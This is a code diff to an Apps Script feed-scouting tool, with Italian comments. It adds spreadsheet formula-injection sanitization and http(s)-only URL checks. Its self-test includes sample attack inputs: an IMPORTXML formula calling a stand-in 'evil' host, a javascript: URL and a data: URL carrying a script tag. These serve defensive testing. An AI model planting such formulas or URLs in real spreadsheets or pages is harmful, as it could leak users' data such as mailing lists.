@@ -176,28 +176,48 @@ function _scFeedDiscovery_(urlSito) {
   return esito;
 }
 
+/**
+ * v4.28.6 SICUREZZA — sanitizzazione anti formula-injection sui campi testuali
+ * di origine ESTERNA (metadati Crossref, HTML dei siti). Stesso pattern adottato
+ * in v4.23.2 per lo scanner news (saveItem). Necessario qui perché il ciclo
+ * settimanale prevede che l'admin APRA il foglio FontiCandidate per decidere:
+ * una formula in cella verrebbe valutata alla visualizzazione e potrebbe
+ * esfiltrare dati di altri fogli dello stesso spreadsheet (es. MailingList).
+ * Fallback locale se l'helper globale non è caricato.
+ */
+function _scSafe_(v) {
+  if (typeof _sanitizeForCell_ === 'function') return _sanitizeForCell_(v);
+  var s = String(v == null ? '' : v);
+  return /^[=+@\-]/.test(s) ? ("'" + s) : s;
+}
+
 /** Scrive una candidata (per nome colonna). Ritorna false se dominio già deciso. */
 function _scProponi_(cand, decisi) {
   var dom = cand.dominio || _scDominio_(cand.urlPagina);
   if (!dom || decisi[dom] || SC_BLACKLIST_RE.test(dom)) return false;
+  // v4.28.6 SICUREZZA: solo http(s). Le URL arrivano da HTML esterno e da
+  // metadati Crossref e finiscono in UrlFetchApp: uno schema diverso
+  // (javascript:, data:, file:) non deve mai entrare nel registro.
+  if (cand.urlPagina && !/^https?:\/\//i.test(String(cand.urlPagina))) return false;
+  if (cand.feed && !/^https?:\/\//i.test(String(cand.feed))) { cand.feed = ''; cand.metodo = 'nessuno'; }
   decisi[dom] = true;
   var sh = _scSheet_(true);
   var riga = new Array(SC_HEADERS.length);
   for (var i = 0; i < SC_HEADERS.length; i++) riga[i] = '';
   function set(c, v) { var j = SC_HEADERS.indexOf(c); if (j >= 0) riga[j] = v; }
   set('ID', 'SC' + Date.now() + '_' + Math.random().toString(36).substr(2, 3));
-  set('Nome', cand.nome || dom);
-  set('Dominio', dom);
-  set('URLPagina', cand.urlPagina || '');
-  set('FeedRilevato', cand.feed || '');
-  set('Metodo', cand.metodo || 'nessuno');
-  set('CategoriaProposta', cand.categoria || 'news');
-  set('TrovataDa', cand.trovataDa);
-  set('Provenienza', cand.provenienza || '');
-  set('Occorrenze', cand.occorrenze || 1);
+  set('Nome', _scSafe_(cand.nome || dom));
+  set('Dominio', _scSafe_(dom));
+  set('URLPagina', _scSafe_(cand.urlPagina || ''));
+  set('FeedRilevato', _scSafe_(cand.feed || ''));
+  set('Metodo', cand.metodo || 'nessuno');           // valore interno controllato
+  set('CategoriaProposta', cand.categoria || 'news'); // valore interno controllato
+  set('TrovataDa', cand.trovataDa);                   // valore interno controllato
+  set('Provenienza', _scSafe_(cand.provenienza || ''));
+  set('Occorrenze', Number(cand.occorrenze) || 1);
   set('DataTrovata', new Date());
   set('Stato', 'in_valutazione');
-  set('Note', cand.note || '');
+  set('Note', _scSafe_(cand.note || ''));
   sh.appendRow(riga);
   return true;
 }
@@ -435,14 +455,16 @@ function scApplicaDecisioni() {
         var shR = getMainSS().getSheetByName('RegistroFonti');
         if (shR && typeof RF_HEADERS !== 'undefined') {
           var hr = shR.getRange(1, 1, 1, shR.getLastColumn()).getValues()[0].map(function (x) { return String(x || '').trim(); });
+          // v4.28.6 SICUREZZA: ri-sanifica alla copia — il foglio candidate è
+          // editabile a mano, quindi non si assume che il contenuto sia pulito
           var riga = _rfRiga_(hr, {
             id: 'RFSC_' + Date.now() + '_' + r,
-            categoria: String(v[r][iCat] || 'news'), nome: String(v[r][iNome] || ''),
-            urlFeed: urlFeed, urlSito: String(v[r][iUrlP] || ''),
+            categoria: String(v[r][iCat] || 'news'), nome: _scSafe_(String(v[r][iNome] || '')),
+            urlFeed: _scSafe_(urlFeed), urlSito: _scSafe_(String(v[r][iUrlP] || '')),
             formato: 'rss', stato: 'quarantena',
             origine: 'scout:' + String(v[r][iDa] || ''),
             approvataDa: 'admin (foglio FontiCandidate)',
-            note: String(v[r][iNote] || '')
+            note: _scSafe_(String(v[r][iNote] || ''))
           });
           shR.getRange(shR.getLastRow() + 1, 1, 1, hr.length).setValues([riga]);
         }
@@ -546,5 +568,18 @@ function scSelfTest() {
   var seen = {}, dupH = 0;
   SC_HEADERS.forEach(function (n) { if (seen[n]) dupH++; seen[n] = 1; });
   eq('header candidate senza duplicati', 0, dupH);
+  // SICUREZZA v4.28.6 — anti formula-injection (security review 02/08).
+  // I metadati Crossref e l'HTML esterno finiscono in un foglio che l'admin
+  // APRE per il ciclo settimanale: una formula verrebbe valutata lì.
+  eq('formula = neutralizzata', "'=IMPORTXML(\"http://evil\")", _scSafe_('=IMPORTXML("http://evil")'));
+  eq('formula + neutralizzata', "'+cmd", _scSafe_('+cmd'));
+  eq('formula @ neutralizzata', "'@SUM(A1)", _scSafe_('@SUM(A1)'));
+  eq('formula - neutralizzata', "'-1+1", _scSafe_('-1+1'));
+  eq('testo normale intatto', 'Museo Egizio', _scSafe_('Museo Egizio'));
+  eq('null gestito', '', _scSafe_(null));
+  // schema URL: solo http(s) può entrare
+  eq('javascript: rifiutato', false, /^https?:\/\//i.test('javascript:alert(1)'));
+  eq('data: rifiutato', false, /^https?:\/\//i.test('data:text/html,<script>'));
+  eq('https accettato', true, /^https?:\/\//i.test('https://museo.it/feed'));
   return { ok: fail === 0, pass: pass, fail: fail, totale: pass + fail, falliti: falliti };
 }
